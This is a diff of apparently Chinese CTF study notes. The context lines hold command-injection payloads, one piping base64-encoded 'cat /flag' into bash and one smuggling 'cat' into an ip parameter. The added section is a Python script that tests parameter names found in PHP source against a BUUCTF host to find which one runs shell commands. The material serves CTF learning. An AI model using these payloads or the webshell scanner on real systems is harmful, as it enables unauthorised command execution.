@@ -72,7 +72,72 @@ echo Y2F0IC9mbGFn|base64 -d|bash
 
     /?ip=127.0.0.1;cat$IFS$9`ls`
 
-* #### 
+* #### 备份源码泄露
+
+脚本扫描是否有shell
+
+```
+import os
+import requests
+import re
+import time
+
+def read_file(path, command):  #遍历文件找出所有可用的参数
+    with open(path,encoding="utf-8") as file:
+        f = file.read()
+    params = {}
+    pattern = re.compile("(?<=\$_GET\[').*?(?='\])")  #match get
+    for name in pattern.findall( f ):
+        params[name] = command
+
+    data = {}
+    pattern = re.compile("(?<=\$_POST\[').*?(?='\])")  #match get
+    for name in pattern.findall( f ):
+        data[name] = command
+    return params, data
+
+def url_explosion(url, path, command):   #确定有效的php文件
+    params, data = read_file(path,command)
+    try:
+        print("Reading " + url + "\r", end='', flush = True)
+        r = requests.session().post(url, data = data, params = params)
+        if r.text.find("haha") != -1 :
+            print(url,"\n")
+            find_params(url, params, data)         
+
+    except:
+        print("\n" + url,"异常")
+   
+def find_params(url, params, data):   #确定最终的有效参数
+    try:
+        for pa in params.keys():
+            temp = {pa:params[pa]}
+            r = requests.session().post(url, params = temp)
+            if r.text.find("haha") != -1 :
+                print(pa)
+                os.system("pause")
+                
+    except:
+        print("error!\n")
+    try:
+        for da in data.items():
+            temp = {da:data[da]}
+            r = requests.session().post(url, data = temp)
+            if r.text.find("haha") != -1 :
+                print(da) 
+                os.system("pause")
+    except:
+        print("error!\n")
+
+
+rootdir = "C:\\CTF\\buuctf\\高明的黑客\\src"  #php文件存放地址
+list = os.listdir(rootdir)
+for i in range(0, len(list)):
+    path = os.path.join(rootdir ,list[i])
+    name = list[i].split('-2')[0]   #获取文件名
+    url = "http://1e688c83-cf4c-4675-b569-6e227ff69914.node3.buuoj.cn/" + name
+    url_explosion(url,path,"echo haha")  
+```
 
 
 
